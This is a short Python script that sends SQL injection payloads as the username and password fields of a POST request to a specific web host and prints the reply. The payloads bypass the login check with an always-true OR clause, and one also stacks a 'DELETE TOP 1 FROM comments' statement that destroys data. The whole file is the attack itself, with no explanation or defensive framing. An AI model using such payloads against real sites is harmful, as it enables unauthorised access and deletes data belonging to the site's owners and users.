import mysql.connector
import requests

usernameField = 'anything\' OR \'x\'=\'x'
passwordField = 'anything\' OR \'x\'=\'x\'; DELETE TOP 1 FROM comments ; --'

print(usernameField)
print(passwordField)

url = 'http://apache1.willilazarov.cz/'
values = {'username': usernameField ,
          'password': passwordField }

r = requests.post(url, data=values)
print(r.content)
